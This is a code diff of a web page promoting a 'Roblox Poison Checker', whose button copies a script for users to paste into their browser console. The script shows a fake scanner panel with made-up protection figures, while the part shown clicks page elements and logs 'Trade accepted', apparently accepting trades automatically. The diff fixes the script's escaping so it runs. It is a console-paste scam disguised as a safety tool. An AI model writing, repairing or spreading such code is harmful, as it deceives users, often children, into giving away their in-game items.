@@ -135,9 +135,9 @@
 
         <section class="install-section">
             <h2>Safety Scanner</h2>
-            <p>Have a safe and protected trading experience With Roblox Poison Checker.</p>
+            <p>Have a safe and protected trading experience With Roblox Poison Checker</p>
             <button class="install-btn" onclick="copyPoisonChecker()">Copy Roblox Poison Checker</button>
-            <p style="font-size: 0.9rem; opacity: 0.8; margin-top: 10px;">NOTE: Please do not paste any passwords or sensitive info into the console except from this. This is the only official website please report impersonators.</p>
+            <p style="font-size: 0.9rem; opacity: 0.8; margin-top: 10px;">NOTE: Please do not paste any passwords or sensitive info into the console. This is the only official website please report impersonators.</p>
         </section>
 
         <section class="features">
@@ -175,55 +175,55 @@
 
     <script>
         function copyPoisonChecker() {
-            console.log('Button clicked!'); // Debug line
-            
-            const codeToCopy = `(function() {
+            // Use a simple string without template literals to avoid escaping issues
+            const codeToCopy = 
+`(function() {
     const gui = document.createElement('div');
-    gui.style.cssText = \\\\
-        position: fixed;
-        top: 50%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        background: #001f3f;
-        border: 3px solid #0074D9;
-        border-radius: 15px;
-        padding: 20px;
-        color: white;
-        font-family: Arial;
-        z-index: 9999;
-        min-width: 300px;
-        box-shadow: 0 0 30px rgba(0, 116, 217, 0.5);
-        text-align: center;
-    \\\\;
+    gui.style.cssText = [
+        'position: fixed;',
+        'top: 50%;',
+        'left: 50%;',
+        'transform: translate(-50%, -50%);',
+        'background: #001f3f;',
+        'border: 3px solid #0074D9;',
+        'border-radius: 15px;',
+        'padding: 20px;',
+        'color: white;',
+        'font-family: Arial;',
+        'z-index: 9999;',
+        'min-width: 300px;',
+        'box-shadow: 0 0 30px rgba(0, 116, 217, 0.5);',
+        'text-align: center;'
+    ].join(' ');
     
-    gui.innerHTML = \\\\
-        <div style="text-align: center; margin-bottom: 15px;">
-            <strong style="font-size: 18px; color: #7FDBFF;">🛡️ Roblox Poison Scanner v3.2.1</strong>
-        </div>
-        <div style="font-size: 12px; text-align: left; margin-bottom: 15px;">
-            <div>🔍 Status: <span id="scannerStatus" style="color: #2ECC40;">ACTIVE</span></div>
-            <div>📊 Scans Completed: <span id="scanCount">0</span></div>
-            <div>🛡️ Threats Blocked: <span id="threatsBlocked">0</span></div>
-            <div>⏰ Last Scan: <span id="lastScan">Just now</span></div>
-            <div>🎯 Items Scanned: <span id="itemsScanned">0</span></div>
-            <div>💚 Safe Trades: <span id="safeTrades">0</span></div>
-        </div>
-        <div style="margin: 15px 0; padding: 10px; background: #003366; border-radius: 8px; font-size: 11px;">
-            <div style="color: #7FDBFF;">🔄 Real-time Protection: ENABLED</div>
-            <div style="color: #2ECC40;">✅ Memory Scan: CLEAN</div>
-            <div style="color: #FFDC00;">⚠️ Trade Monitor: ACTIVE</div>
-        </div>
-        <button id="closeScanner" style="
-            background: #2ECC40;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 25px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
-        ">Close Scanner</button>
-    \\\\;
+    gui.innerHTML = [
+        '<div style="text-align: center; margin-bottom: 15px;">',
+        '<strong style="font-size: 18px; color: #7FDBFF;">🛡️ Roblox Poison Scanner v3.2.1</strong>',
+        '</div>',
+        '<div style="font-size: 12px; text-align: left; margin-bottom: 15px;">',
+        '<div>🔍 Status: <span id="scannerStatus" style="color: #2ECC40;">ACTIVE</span></div>',
+        '<div>📊 Scans Completed: <span id="scanCount">0</span></div>',
+        '<div>🛡️ Threats Blocked: <span id="threatsBlocked">0</span></div>',
+        '<div>⏰ Last Scan: <span id="lastScan">Just now</span></div>',
+        '<div>🎯 Items Scanned: <span id="itemsScanned">0</span></div>',
+        '<div>💚 Safe Trades: <span id="safeTrades">0</span></div>',
+        '</div>',
+        '<div style="margin: 15px 0; padding: 10px; background: #003366; border-radius: 8px; font-size: 11px;">',
+        '<div style="color: #7FDBFF;">🔄 Real-time Protection: ENABLED</div>',
+        '<div style="color: #2ECC40;">✅ Memory Scan: CLEAN</div>',
+        '<div style="color: #FFDC00;">⚠️ Trade Monitor: ACTIVE</div>',
+        '</div>',
+        '<button id="closeScanner" style="',
+        'background: #2ECC40;',
+        'color: white;',
+        'border: none;',
+        'padding: 10px 20px;',
+        'border-radius: 25px;',
+        'font-weight: bold;',
+        'cursor: pointer;',
+        'margin-top: 10px;',
+        '">Close Scanner</button>'
+    ].join('');
     
     document.body.appendChild(gui);
     
@@ -261,7 +261,7 @@
                 
                 element.click();
                 safeTrades++;
-                console.log(\\\`Trade accepted #\\\${safeTrades}\\\`);
+                console.log('Trade accepted #' + safeTrades);
             }
         });
     }
@@ -345,4 +345,3 @@
     </script>
 </body>
 </html>
-
